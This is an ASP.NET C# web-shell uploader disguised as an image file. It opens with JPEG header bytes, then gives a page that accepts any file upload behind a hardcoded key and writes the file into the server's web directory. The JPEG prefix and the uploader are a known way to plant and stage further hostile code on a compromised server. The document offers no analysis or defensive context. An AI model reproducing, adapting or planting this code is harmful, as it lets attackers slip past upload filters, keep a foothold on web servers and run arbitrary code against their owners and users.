ÿØÿà�JFIF������ÿÛ�C�	
% !###&)&")"#"ÿÛ�C		"""""""""""""""""""""""""""""""""""""""""""""""""""ÿÂ��á4"�ÿÄ��������������ÿÄ��������������ÿÚ����h?£¨x§´ÍB¤}9ÁT¿=\m!yÔW©Ï.9NÉ%k©(aRV)t°;~:GOÊO¾£ÖÅfº³NKV;ß=Õ%îJ¤xcóêÊC´BÏò¢~6·Øª4¹]<´/æÊ#"®¦)ÌeDÕT®\N´j¤%dï¸$°s?¡Qì	
<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<script runat="server">
    private const string AUTHKEY = "woanware";
    private const string HEADER = "<html>\n<head>\n<title>filesystembrowser</title>\n<style type=\"text/css\"><!--\nbody,table,p,pre,form input,form select {\n font-family: \"Lucida Console\", monospace;\n font-size: 88%;\n}\n-->\n</style></head>\n<body>\n";
    private const string FOOTER = "</body>\n</html>\n";

    /// <summary>
    /// 
    /// </summary>
    /// <param name="sender"></param>
    /// <param name="e"></param>
    protected void Page_Load(object sender, EventArgs e)
    {
        try
        {
            if (Request.Params["authkey"] == null)
            {
                Response.Write(HEADER);
                Response.Write(this.GetUploadControls());
                Response.Write(FOOTER);
                return;
            }

            if (Request.Params["authkey"] != AUTHKEY)
            {
                Response.Write(HEADER);
                Response.Write(this.GetUploadControls());
                Response.Write(FOOTER);
                return;
            }
            
            if (Request.Params["operation"] != null)
            {
                if (Request.Params["operation"] == "upload")
                {
                    Response.Write(HEADER);
                    Response.Write(this.UploadFile());
                    Response.Write(FOOTER);
                }
                else
                {
                    Response.Write(HEADER);
                    Response.Write("Unknown operation");
                    Response.Write(FOOTER);
                }
            }
            else
            {
                Response.Write(HEADER);
                Response.Write(this.GetUploadControls());
                Response.Write(FOOTER);
            }
        }
        catch (Exception ex)
        {
            Response.Write(HEADER);
            Response.Write(ex.Message);
            Response.Write(FOOTER);
        }
    }

    /// <summary>
    /// 
    /// </summary>
    private string UploadFile()
    {
        try
        {
            if (Request.Params["authkey"] == null)
            {
                return string.Empty;
            }

            if (Request.Params["authkey"] != AUTHKEY)
            {
                return string.Empty;
            }
            
            if (Request.Files.Count != 1)
            {
                return "No file selected";
            }

            HttpPostedFile httpPostedFile = Request.Files[0];

            int fileLength = httpPostedFile.ContentLength;
            byte[] buffer = new byte[fileLength];
            httpPostedFile.InputStream.Read(buffer, 0, fileLength);

            FileInfo fileInfo = new FileInfo(Request.PhysicalPath);
            using (FileStream fileStream = new FileStream(Path.Combine(fileInfo.DirectoryName, Path.GetFileName(httpPostedFile.FileName)), FileMode.Create))
            {
                fileStream.Write(buffer, 0, buffer.Length);
            }

            return "File uploaded";
        }
        catch (Exception ex)
        {
            return ex.ToString();
        }
    }

    /// <summary>
    /// 
    /// </summary>
    /// <returns></returns>
    private string GetUploadControls()
    {
        string temp = string.Empty;

        temp = "<form enctype=\"multipart/form-data\" action=\"?operation=upload\" method=\"post\">";
        temp += "<br>Auth Key: <input type=\"text\" name=\"authKey\"><br>";
        temp += "<br>Please specify a file: <input type=\"file\" name=\"file\"></br>";
        temp += "<div><input type=\"submit\" value=\"Send\"></div>";
        temp += "</form>";

        return temp;
    }
</script>

<!-- Created by Mark Woan (http://www.woanware.co.uk) -->
